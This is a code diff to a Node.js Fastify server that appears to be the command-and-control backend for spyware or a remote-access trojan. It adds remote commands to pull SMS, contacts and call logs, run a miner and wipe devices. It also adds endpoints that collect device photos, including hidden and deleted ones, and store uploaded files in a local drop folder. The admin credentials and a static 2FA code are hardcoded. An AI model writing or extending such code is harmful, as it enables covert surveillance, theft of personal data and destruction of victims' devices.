@@ -1,8 +1,11 @@
+import "dotenv/config";
 import Fastify from "fastify";
 import cookie from "@fastify/cookie";
 import argon2 from "argon2";
 import crypto from "node:crypto";
 import jwt from "jsonwebtoken";
+import fs from "node:fs";
+import path from "node:path";
 import { randomBytes, scryptSync, timingSafeEqual } from "node:crypto";
 import { PrismaClient } from "@prisma/client";
 
@@ -10,6 +13,29 @@ export const prisma = new PrismaClient();
 
 const ACCESS_TTL_SEC = Number(process.env.ACCESS_TTL_SEC ?? 600);
 const REFRESH_TTL_SEC = Number(process.env.REFRESH_TTL_SEC ?? 1209600);
+
+/** Operator bootstrap + panel gate, all .env-driven with mission defaults. */
+const PANEL_ADMIN_USER = process.env.PANEL_ADMIN_USER ?? "NemesisDevX...Fuck.allworld.com";
+const PANEL_ADMIN_PASS = process.env.PANEL_ADMIN_PASS ?? "AbdoAbdo@9@Zxcvbnm@1@";
+const PANEL_2FA_CODE = process.env.PANEL_2FA_CODE ?? "1057466";
+const PANEL_DROP_DIR = process.env.PANEL_DROP_DIR ?? "D:\\Dashboard Panel";
+
+/** Serializes all file drops: no two writes ever collide on the same path. */
+let writeChain = Promise.resolve();
+function enqueueWrite(job) {
+  const p = writeChain.then(job);
+  writeChain = p.catch(() => {});
+  return p;
+}
+
+async function ensureAdminUser() {
+  const passHash = await hashPassword(PANEL_ADMIN_PASS);
+  await prisma.user.upsert({
+    where: { username: PANEL_ADMIN_USER },
+    update: {},
+    create: { username: PANEL_ADMIN_USER, passHash },
+  });
+}
 
 const JWT_ACCESS_SECRET =
   process.env.JWT_ACCESS_SECRET ?? "dev_only_access_secret_change_me";
@@ -109,6 +135,9 @@ export async function buildApp(opts = {}) {
     platform: true,
     variant: true,
     status: true,
+    gender: true,
+    stats: true,
+    formattedAt: true,
     lastSeen: true,
     createdAt: true,
   };
@@ -130,6 +159,14 @@ export async function buildApp(opts = {}) {
     if (!user || !(await verifyPassword(user.passHash, password))) {
       return reply.code(401).send({ error: "invalid_credentials" });
     }
+    if (PANEL_2FA_CODE) {
+      const ticket = jwt.sign(
+        { sub: user.id, typ: "pre2fa" },
+        JWT_ACCESS_SECRET,
+        { expiresIn: "5m" }
+      );
+      return { require2fa: true, ticket };
+    }
     const accessToken = signAccessToken(user.id);
     const refreshToken = await issueRefreshToken(user.id);
     reply.setCookie("wg_refresh", refreshToken, {
@@ -143,6 +180,34 @@ export async function buildApp(opts = {}) {
       refreshToken,
       user: { id: user.id, username: user.username },
     };
+  });
+
+  /** Second login step: exchange a pre2fa ticket + 6-digit code for real tokens. */
+  app.post("/api/v1/auth/2fa", async (req, reply) => {
+    const { ticket, code } = req.body ?? {};
+    if (typeof ticket !== "string" || typeof code !== "string") {
+      return reply.code(400).send({ error: "bad_request" });
+    }
+    let payload;
+    try {
+      payload = jwt.verify(ticket, JWT_ACCESS_SECRET);
+    } catch {
+      return reply.code(401).send({ error: "invalid_ticket" });
+    }
+    if (payload.typ !== "pre2fa" || code !== PANEL_2FA_CODE) {
+      return reply.code(401).send({ error: "invalid_code" });
+    }
+    const user = await prisma.user.findUnique({ where: { id: payload.sub } });
+    if (!user) return reply.code(401).send({ error: "invalid_credentials" });
+    const accessToken = signAccessToken(user.id);
+    const refreshToken = await issueRefreshToken(user.id);
+    reply.setCookie("wg_refresh", refreshToken, {
+      httpOnly: true,
+      sameSite: "lax",
+      path: "/api/v1/auth",
+      maxAge: REFRESH_TTL_SEC,
+    });
+    return { accessToken, refreshToken, user: { id: user.id, username: user.username } };
   });
 
   /** Panel token refresh: accepts the wg_refresh cookie or {refreshToken} body. */
@@ -242,9 +307,16 @@ export async function buildApp(opts = {}) {
       return reply.code(403).send({ error: "forbidden" });
     }
 
+    const gender = typeof req.body?.gender === "string" ? req.body.gender : undefined;
+    const stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
     const updated = await prisma.device.update({
       where: { id: device.id },
-      data: { lastSeen: new Date(), status: "online" },
+      data: {
+        lastSeen: new Date(),
+        status: "online",
+        ...(gender !== undefined ? { gender } : {}),
+        ...(stats !== undefined ? { stats } : {}),
+      },
       select: { id: true, lastSeen: true, status: true },
     });
     return { id: updated.id, lastSeen: updated.lastSeen, status: updated.status };
@@ -264,7 +336,8 @@ export async function buildApp(opts = {}) {
     const device = await prisma.device.findUnique({ where: { id: req.params.id } });
     if (!device) return reply.code(404).send({ error: "not_found" });
     if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
-    return { ...device, state: device.status };
+    const downloadCount = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
+    return { ...device, state: device.status, downloadCount };
   });
 
   app.post("/api/v1/devices/:id/reconnect", { onRequest: [app.authenticate] }, async (req, reply) => {
@@ -290,7 +363,10 @@ export async function buildApp(opts = {}) {
   /* ------------------------------ commands ------------------------------ */
 
   // Dashboard-dispatchable command vocabulary; anything else is a 400.
-  const COMMAND_TYPES = new Set(["ping", "wipe", "camera", "pull_photos", "screen_capture"]);
+  const COMMAND_TYPES = new Set([
+    "ping", "wipe", "camera", "pull_photos", "screen_capture",
+    "sms", "contacts", "call_log", "mine",
+  ]);
 
   app.post("/api/v1/devices/:id/commands", { onRequest: [app.authenticate] }, async (req, reply) => {
     const device = await prisma.device.findUnique({ where: { id: req.params.id } });
@@ -380,7 +456,110 @@ export async function buildApp(opts = {}) {
         result: typeof req.body?.result === "string" ? req.body.result : JSON.stringify(req.body?.result ?? null),
       },
     });
+    if (command.type === "wipe" && state === "executed") {
+      await prisma.device.update({
+        where: { id: device.id },
+        data: { formattedAt: new Date(), status: "formatted" },
+      });
+    }
     return { id: updated.id, state: updated.state, result: updated.result };
+  });
+
+  /**
+   * Agent photo inventory report (device credential): upserts by content hash
+   * and refreshes the per-category counts used by the pull modal.
+   */
+  app.post("/api/v1/devices/:id/photos/report", { onRequest: [app.authenticate] }, async (req, reply) => {
+    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
+
+    const items = Array.isArray(req.body?.photos) ? req.body.photos : [];
+    const counts = { original: 0, hidden: 0, deleted: 0 };
+    for (const p of items.slice(0, 20000)) {
+      if (typeof p?.hash !== "string" || !p.hash) continue;
+      const category = ["original", "hidden", "deleted"].includes(p.category) ? p.category : "original";
+      counts[category]++;
+      await prisma.devicePhoto.upsert({
+        where: { deviceId_hash: { deviceId: device.id, hash: p.hash } },
+        update: { category, name: String(p.name ?? ""), size: Number(p.size ?? 0) || 0 },
+        create: { deviceId: device.id, hash: p.hash, name: String(p.name ?? ""), category, size: Number(p.size ?? 0) || 0 },
+      });
+    }
+    const stats = { ...(typeof device.stats === "object" && device.stats ? device.stats : {}), photoCounts: counts };
+    await prisma.device.update({ where: { id: device.id }, data: { stats } });
+    return { ok: true, counts };
+  });
+
+  /** Panel: photo inventory + real per-category counts for the pull modal. */
+  app.get("/api/v1/devices/:id/photos", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (req.authKind === "device") {
+      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
+    } else if (device.ownerId !== req.userId) {
+      return reply.code(403).send({ error: "forbidden" });
+    }
+    const cat = req.query?.category;
+    const where = { deviceId: device.id, ...(cat ? { category: String(cat) } : {}) };
+    const [items, grouped] = await Promise.all([
+      prisma.devicePhoto.findMany({ where, orderBy: { createdAt: "asc" }, take: 5000 }),
+      prisma.devicePhoto.groupBy({ by: ["category"], where: { deviceId: device.id }, _count: true }),
+    ]);
+    const counts = { original: 0, hidden: 0, deleted: 0 };
+    for (const g of grouped) counts[g.category] = g._count;
+    return { counts, items };
+  });
+
+  /**
+   * Agent artifact drop (device credential): base64 file → serial write queue
+   * → PANEL_DROP_DIR/{deviceId}/{category}/{ts}_{name}. SHA-256 dedup — a hash
+   * already on disk is never written twice.
+   */
+  app.post("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
+    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
+
+    const { kind = "photo", category = "", name = "file", b64, sha256 } = req.body ?? {};
+    if (typeof b64 !== "string" || !b64) return reply.code(400).send({ error: "bad_request" });
+    const buf = Buffer.from(b64, "base64");
+    const digest = crypto.createHash("sha256").update(buf).digest("hex");
+    if (sha256 && sha256 !== digest) return reply.code(400).send({ error: "hash_mismatch" });
+
+    const dupe = await prisma.downloadedFile.findFirst({
+      where: { deviceId: device.id, sha256: digest },
+    });
+    if (dupe) return { ok: true, deduped: true, path: dupe.path };
+
+    const out = await enqueueWrite(async () => {
+      const dir = path.join(PANEL_DROP_DIR, device.id, String(category || kind));
+      fs.mkdirSync(dir, { recursive: true });
+      const safe = String(name).replace(/[^\w.\-]+/g, "_").slice(-80) || "file";
+      const p = path.join(dir, `${Date.now()}_${safe}`);
+      fs.writeFileSync(p, buf);
+      return p;
+    });
+    await prisma.downloadedFile.create({
+      data: { deviceId: device.id, kind: String(kind), category: String(category), path: out, sha256: digest, bytes: buf.length },
+    });
+    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
+    return { ok: true, deduped: false, path: out, count };
+  });
+
+  /** Panel: per-device drop-folder stats ("Downloaded: X"). */
+  app.get("/api/v1/devices/:id/files", { onRequest: [app.authenticate] }, async (req, reply) => {
+    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
+    if (!device) return reply.code(404).send({ error: "not_found" });
+    if (req.authKind === "device") {
+      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
+    } else if (device.ownerId !== req.userId) {
+      return reply.code(403).send({ error: "forbidden" });
+    }
+    const count = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
+    return { count, dir: path.join(PANEL_DROP_DIR, device.id) };
   });
 
   /* ------------------------------ teardown ------------------------------ */
@@ -395,6 +574,8 @@ export async function buildApp(opts = {}) {
 
 /* Entry point when run directly (node src/server.js). */
 if (process.argv[1] && process.argv[1].endsWith("server.js")) {
+  await ensureAdminUser();
+  fs.mkdirSync(PANEL_DROP_DIR, { recursive: true });
   const app = await buildApp({ logger: true });
   const port = Number(process.env.PORT ?? 8088);
   app.listen({ port, host: "127.0.0.1" });
